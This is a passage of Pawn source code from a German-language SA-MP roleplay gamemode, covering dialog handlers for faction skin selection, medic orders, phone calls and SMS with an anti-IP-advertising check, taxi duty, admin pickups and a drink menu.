                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 15:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 16;
							PlayerInfo[playerid][pMember] = 16;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 16:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 17;
							PlayerInfo[playerid][pMember] = 17;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 17:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 18;
							PlayerInfo[playerid][pMember] = 18;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 18:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 19;
							PlayerInfo[playerid][pMember] = 19;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 19:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 20;
							PlayerInfo[playerid][pMember] = 20;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 20:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 21;
							PlayerInfo[playerid][pMember] = 21;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 21:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 22;
							PlayerInfo[playerid][pMember] = 22;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 22:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 23;
							PlayerInfo[playerid][pMember] = 23;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
                case 23:
				{
							//--------------------------------------
							PlayerInfo[playerid][sMember] = 24;
							PlayerInfo[playerid][pMember] = 24;
							//--------------------------------------
							PlayerInfo[playerid][pRank] = 1;
							SetPlayerInterior(playerid,0);
                            SetPlayerPos(playerid, 1497.9749,-1664.6473,34.0469);
			                SetPlayerCameraPos(playerid, 1492.5426,-1664.8420,36.3946);
			                SetPlayerCameraLookAt(playerid, 1494.4083,-1664.8248,35.7894);
		                	SetPlayerFacingAngle(playerid, 88.4779);
							FreezePlayer(playerid);
						    SelectChar[playerid] = 255;
						    SelectCharID[playerid] = PlayerInfo[playerid][pMember];
						    SelectCharPlace[playerid] = 1;
						    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
					    	PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bitte wähle deinen Skin mit der Shift Taste aus.");
			                SendClientMessage(playerid, COLOR_LIGHTRED, "* Bestätige deinen Skin mit der Entertaste.");
							SetPlayerVirtualWorld(playerid, 3);
        	    }
            }
        }
        return 1; // We handled a dialog, so return 1. Just like OnPlayerCommandText.
    }
    if(dialogid == DIALOG_AUFTRAGE)
    {
		new i = DialogTemp[playerid][listitem];
		SetPlayerCheckpoint(playerid, PlayerInfo[i][pPos_x],PlayerInfo[i][pPos_y],PlayerInfo[i][pPos_z], 3.0);// Timer als Gametext setten wenn auftrag angenommen wird
		new stringd[128];
		format(stringd,128,"<< %s %s hat den Auftrag von %s angenommen! >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]),GetName(playerid),GetName(i));
		SendFamilyMessage(4, COLOR_LIGHTRED, stringd);
	    format(stringd, sizeof(stringd), "* Du hast den Auftrag von %s angenommen! Du hast nun %d Sekunden Zeit.", GetName(i),PlayerInfo[i][pTotTime]);
	    SendClientMessage(playerid, COLOR_LIGHTBLUE, stringd);

	    format(stringd, sizeof(stringd), "* Arzt %s hat deinen ruf angenommen und ist nun unterwegs zu dir.", GetName(playerid));
	    SendClientMessage(i, COLOR_LIGHTBLUE, stringd);


		PlayerInfo[playerid][pAuftrag] = PlayerInfo[i][pTotTime];
		return 1;
	}
    if(dialogid == DIALOG_WANTED)
    {
		new i = DialogTempWanted[playerid][listitem];
 	    new Float:x, Float:y, Float:z;
	    GetPlayerPos(i, x, y, z);
		SetPlayerCheckpoint(playerid, x,y,z, 3.0);
		SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Dir wurde ein Checkpoint gesetzt, Fahre nun zum Checkpoint.");
		Navi[playerid] = 1;
		return 1;
	}
    if(dialogid == DIALOG_CARLIST)
    {
		new i = DialogTempCarlist[playerid][listitem];
        new Float:vehx, Float:vehy, Float:vehz;
        GetVehiclePos(i, vehx, vehy, vehz);
		SetPlayerCheckpoint(playerid, vehx,vehx,vehz, 3.0);
		SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Dir wurde ein Checkpoint gesetzt, Fahre nun zum Checkpoint.");
		Navi[playerid] = 1;
		return 1;
	}
    if(dialogid == DIALOG_CALL)
    {
	    if(response == 0)
		{
		    SCM(playerid,COLOR_GRAD2,"Abgebrochen.");
			return 1;
		}
        if(listitem	==	0)
        {
			ShowPlayerDialog(playerid,4728, DIALOG_STYLE_INPUT, "SMS", "Gebe nun die Nachricht ein die du senden möchtest:", "Senden", "Abbrechen");
	    }
        if(listitem	==	1)
        {
			new string[128];
			new anrufer = PlayerInfo[pCaller[playerid]][pPnumber];
			if(PlayerInfo[playerid][pTot] == 1)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Du wirst behandelt und kannst nicht telefonieren!");
		        return 1;
		    }
			if(PlayerTied[playerid] == 1)
			{
			    SendClientMessage(playerid, COLOR_LIGHTRED, "Du kannst keinen anrufen, während du gefesselt bist!");
			    return 1;
			}
			if(PlayerInfo[playerid][pHandyGeld] <= 4 && PlayerInfo[playerid][pHandyVer] == 0)
	    	{
	        	ShowPlayerDialog(playerid, KEINGUTHABEN, DIALOG_STYLE_MSGBOX, "Handy Guthaben", "Hallo Lieber User,\nMomentan hast du kein Geld auf deinem Handy\nDas kann daran liegen das du es aufgebraucht hast oder\nDas du noch kein Geld drauf hattest!\nGehe zum ATM und laden dein Handy auf!", "Okay", "Abbrechen");
				return 1;
	    	}
//			anrufer = strval(tmp);
			if(anrufer == PlayerInfo[playerid][pPnumber])
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Du kannst nicht dich selber anrufen!");
				return 1;
			}
			if(Mobile[playerid] != 255)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "  Du bist schon am Telefonieren...");
				return 1;
			}
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerInfo[i][pPnumber] == anrufer && anrufer != 0)
					{
					    if(Mobile[pCaller[playerid]] == 255)
                        {
							pCaller[playerid] = i;
							Mobile[playerid] = pCaller[playerid]; //caller connecting
							if(IsPlayerConnected(pCaller[playerid]))
							{
							    if(pCaller[playerid] != INVALID_PLAYER_ID)
							    {
							        if(PhoneOnline[pCaller[playerid]] > 0)
							        {
							            SendClientMessage(playerid, COLOR_GREY, "Das Handy von diesem Spieler ist ausgeschalten!");
							            return 1;
							        }
									format(string, sizeof(string), "Dein Handy klingelt. (/Pickup) Anrufer: %s", GetName(playerid));
									SendClientMessage(pCaller[playerid], COLOR_YELLOW, string);
									RingTone[pCaller[playerid]] = 10;
			                        format(string, sizeof(string), "* %s nimmt sein Handy raus.", GetName(playerid));
			                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
									SendClientMessage(playerid, COLOR_WHITE, "HILFE: Du kannst jetzt mit \"T\" über das Telefon reden. Gib /hangup ein um aufzulegen.");
									CellTime[playerid] = 1;
									if(PlayerInfo[playerid][pHandyVer] == 0) PlayerInfo[playerid][pHandyGeld] -= 4;
									return 1;
								}
							}
						}
						else
						{
						    SendClientMessage(playerid,COLOR_GREY," Die Leitung ist besetzt...");
						    format(string,sizeof(string)," Anruf von %s geblockt. Du bist noch in einem Gespräch!",GetName(playerid));
						    SendClientMessage(pCaller[playerid],COLOR_PURPLE,string);
						    return 1;
						}
					}
				}
			}
			SendClientMessage(playerid, COLOR_GRAD2, "  *TUT TUT TUT*  Kein Anschluss unter dieser Nummer. *TUT TUT TUT*");
	    }
        return 1;
    }
    if(dialogid == 4728)//SMS
    {
		    if(response == 0)
			{
			    SCM(playerid,COLOR_GRAD2,"Abgebrochen.");
				return 1;
			}
		    if(PlayerInfo[playerid][pTot] == 1)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "Tote können nicht Reden!");
		        return 1;
		    }
			if(PlayerInfo[playerid][pHandyGeld] <= 0 && PlayerInfo[playerid][pHandyVer] == 0)
	    	{
	        	SendClientMessage(playerid, COLOR_GREY, "  Du hast nicht genug Guthaben um den Anruf zu Bezahlen.");
            	SendClientMessage(playerid, COLOR_GREY, "  Geh zum ATM dort kannst du dir Prepaid Karten kaufen.");
            	SendClientMessage(playerid, COLOR_GREY, "  Es gibt 30$, 60$, und 90$ Guthabenkarten.");
				return 1;
	    	}
		    if(PlayerInfo[playerid][pGangJailed] == 1)
		    {
		        SendClientMessage(playerid, COLOR_LIGHTRED, "Du hast im Gangjail kein Empfang!");
		        return 0;
			}
			if(PlayerTied[playerid] == 1)
			{
			    SendClientMessage(playerid, COLOR_LIGHTRED, "Du kannst keinem eine SMS schreiben, während du gefesselt bist!");
			    return 0;
			}
			new string[128];
			format(string, sizeof(string), "* %s nimmt sein Handy raus.", GetName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			new anrufer = PlayerInfo[pCaller[playerid]][pPnumber];
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerInfo[i][pPnumber] == anrufer && anrufer != 0)
					{
						pCaller[playerid] = i;
						Mobile[playerid] = pCaller[playerid]; //caller connecting
						if(IsPlayerConnected(pCaller[playerid]))
						{
							if(pCaller[playerid] != INVALID_PLAYER_ID)
							{
						    	if(PhoneOnline[pCaller[playerid]] > 0)
						    	{
							        SendClientMessage(playerid, COLOR_GREY, "Das Handy von diesem Spieler ist ausgeschalten!");
						        	return 1;
						    	}
								format(string, sizeof(string), "SMS: %s, von: %s (%d)", inputtext,GetName(playerid),PlayerInfo[playerid][pPnumber]);
								RingTone[pCaller[playerid]] =20;
								SendClientMessage(playerid, COLOR_WHITE, "Gesendet");
								SendClientMessage(pCaller[playerid], COLOR_YELLOW, string);
								SendClientMessage(playerid,  COLOR_YELLOW, string);
								format(string, sizeof(string), "~r~$-%d", txtcost);
								GameTextForPlayer(playerid, string, 5000, 1);
								//PlayerInfo[playerid][pHandyGeld] -= txtcost;
       							if(PlayerInfo[playerid][pHandyVer] == 0) PlayerInfo[playerid][pHandyGeld] -= 1;
					       		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					       		Mobile[playerid] = 255;
								new lastidx = (strlen(inputtext) - 1);
								if(inputtext[lastidx] == '.')
								    inputtext[lastidx] = ' ';

								new countit = 0;
								for(new x=0; x<strlen(inputtext); x++)
								{
									if(inputtext[x] == '.' && inputtext[x+1] <= '9' && inputtext[x+1] >= '0') // Es wurde ein Punkt und eine Zahl dahinter geschrieben!
									{
									    countit++;
									}
									else if(inputtext[x] == '.' && inputtext[x+2] <= '9' && inputtext[x+2] >= '0') // Es wurde ein Punkt, Leerzeichen und eine Zahl dahinter geschrieben!
									{
									    countit++;
									}
								}
								if(countit >= 3 && PlayerInfo[playerid][pAdmin] <1) // Dreimal und eine IP wird erkannt
								if(strfind(inputtext,"5.135.112.217:4021",true) != 0) // NICHT die TS-IP
								if(strfind(inputtext,"5.135.112.217:4021",true) != 0)
								{
									new textstring[128], name[MAX_PLAYER_NAME];
									GetPlayerName(playerid,name,sizeof(name));
									format(textstring,sizeof(textstring),"AdmWarning %s wird verdächtigt eine IP zu verschicken!",name);
										ABroadCast(COLOR_LIGHTRED,textstring,1);
									format(textstring,sizeof(textstring),"AdmWarning %s: %s",name,inputtext);
										ABroadCast(COLOR_LIGHTRED,textstring,1);
									SendClientMessage(playerid,COLOR_RED,"Es ist nicht erlaubt IPs in den Chat zu Schreiben!");
									gPlayerAbwerbeTrys[playerid]++;
									if(gPlayerAbwerbeTrys[playerid] >= 3)//{ad3031}%s wurde von %s gebannt, Grund: %s
									{
									    format(textstring,sizeof(textstring),"%s wurde vom Server gekickt, Grund: Abwerbe",name);
									    SendClientMessageToAll(COLOR_RED,textstring);
							        	SetTimerEx("kicktimerfake", 100,false,"i",playerid);
									}
									return 1;
								}
								return 1;
							}
						}
					}
				}
			}
			SendClientMessage(playerid, COLOR_GRAD2, "Senden Fehlgeschlagen");
        return 1;
    }
    if(dialogid == DIALOG_TAXIFAHRER)
    {
		new amount = strval(inputtext);
//		new amount[128] = inputtext;
		if(amount < 1 || amount > 500) { SendClientMessage(playerid, COLOR_GREY, "   Preis muss zwischen 1 und 500 Dollar liegen!"); return 1; }
		TaxiDrivers += 1; TransportDuty[playerid] = 1; TransportValue[playerid] = amount;
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du bist nun im Dienst als Taxifahrer!");
		SetPlayerColor(playerid,NAMECOLOR_TAXI); // Copfarbe

		new strin123231g[128];
        format(strin123231g, sizeof(strin123231g), "Taxi Company\n\nFahrer: %s\nFahrpreis: %d.", GetName(playerid),amount);
		Update3DTextLabelText(taxi3dtext[GetPlayerVehicleID(playerid)], COLOR_YELLOW, strin123231g);

        return 1; // We handled a dialog, so return 1. Just like OnPlayerCommandText.
    }
  if(dialogid == DIALOG_PICKUP)
  {
    if(response)
    {
      if(listitem==0)
      {
		if(healpickupvar == 1)
        {
		SendClientMessage(playerid, COLOR_GRAD2, "Du hast bereits ein Pickup erstellt!.");
		return true;
        }
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid, x, y, z);
        healpickup = CreatePickup(1240, 1, x, y, z, -1);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Healpickup erstellt!.");
		healpickupvar = 1;
      }
      if(listitem==1)
      {
		if(deaglepickupvar == 1)
        {
		SendClientMessage(playerid, COLOR_GRAD2, "Du hast bereits ein Pickup erstellt!.");
		return true;
        }
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid, x, y, z);
        deaglepickup = CreatePickup(348, 1, x, y, z, -1);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Deaglepickup erstellt!.");
		deaglepickupvar = 1;
      }
      if(listitem==2)
      {
		if(spawnpickupvar == 1)
        {
		SendClientMessage(playerid, COLOR_GRAD2, "Du hast bereits ein Pickup erstellt!.");
		return true;
        }
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid, x, y, z);
        spawnpickup = CreatePickup(1272, 1, x, y+2, z, -1);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Spawnpickup erstellt!.");
		spawnpickupvar = 1;
      }
      if(listitem==3)
      {
		if(armourpickupvar == 1)
        {
		SendClientMessage(playerid, COLOR_GRAD2, "Du hast bereits ein Pickup erstellt!.");
		return true;
        }
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid, x, y, z);
        armourpickup = CreatePickup(1242, 1, x, y+2, z, -1);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Armourpickup erstellt!.");
		armourpickupvar = 1;
      }
      if(listitem==4)
      {
		if(healpickupvar == 0)
        {
		SendClientMessage(playerid, COLOR_GRAD2, "Das Pickup exestiert nicht!.");
		return true;
        }
        DestroyPickup(healpickup);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Healpickup entfernt!.");
		healpickupvar = 0;
      }
      if(listitem==5)
      {
		if(deaglepickupvar == 0)
        {
		SendClientMessage(playerid, COLOR_GRAD2, "Das Pickup exestiert nicht!.");
		return true;
        }
        DestroyPickup(deaglepickup);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Deaglepickup entfernt!.");
		deaglepickupvar = 0;
      }
      if(listitem==6)
      {
		if(spawnpickupvar == 0)
        {
		SendClientMessage(playerid, COLOR_GRAD2, "Das Pickup exestiert nicht!.");
		return true;
        }
        DestroyPickup(spawnpickup);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Spawnpickup entfernt!.");
		spawnpickupvar = 0;
      }
      if(listitem==7)
      {
		if(armourpickupvar == 0)
        {
		SendClientMessage(playerid, COLOR_GRAD2, "Das Pickup exestiert nicht!.");
		return true;
        }
        DestroyPickup(armourpickup);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Armourpickup entfernt!.");
		armourpickupvar = 0;
      }
    }
  }

	if(dialogid == DIALOG_DRINK)
	{
	    new string[128];
	    if(response == 0)
		{
		    SCM(playerid,COLOR_GRAD2,"Abgebrochen.");
		}
	    if(response == 1)
	    {
	        switch (listitem)
	        {
	            case 0:
				{
	                format(string, sizeof(string), "%s trinkt ein Glas Mineralwasser.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	                new Float:health;

					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 1;
GivePlayerMoneySave(playerid, -1);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-1;
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 15; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 15.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 1:
	            {
	                format(string, sizeof(string), "%s trinkt ein Glas Coca Cola.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	            	new Float:health;
GivePlayerMoneySave(playerid, -2);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 1;
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-2;
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 15; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 15.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 2:
	            {
	                format(string, sizeof(string), "%s trinkt eine Dose Red Bull.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	                new Float:health;
GivePlayerMoneySave(playerid, -6);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 1;
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-6;
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 30; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 30.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 3:
	            {
	                format(string, sizeof(string), "%s trinkt ein Glas ACE-Saft.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	                new Float:health;
GivePlayerMoneySave(playerid, -1);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 1;
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-1;
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 15; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 15.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 4:
	            {
	                format(string, sizeof(string), "%s trinkt ein Glas Eistee.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	                new Float:health;
GivePlayerMoneySave(playerid, -2);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 2;
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-2;
                    if(GetPlayerHealth(playerid, health) < 100)
                    {
                        if(PlayerInfo[playerid][pAlcoholPerk] > 0) { new hp = 2 * PlayerInfo[playerid][pAlcoholPerk]; hp += 15; SetPlayerHealth(playerid, health + hp); }
                        else { SetPlayerHealth(playerid, health + 15.0); }
                        if(GetPlayerHealth(playerid, health) > 100) SetPlayerHealth(playerid, 100);
                    }
             	}
             	case 5:
	            {
	                new Float:health;
	                format(string, sizeof(string), "%s trinkt eine Flasche Becks.", GetName(playerid));
          			ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
GivePlayerMoneySave(playerid, -3);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 1;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-3;
                    PlayerDrunk[playerid] += 1;
                    if(PlayerDrunk[playerid] >= 7)
                    {
                        GameTextForPlayer(playerid, "~w~Du bist~n~~p~Betrunken", 3500, 1);
                        SetPlayerDrunkLevel(playerid, 10000);
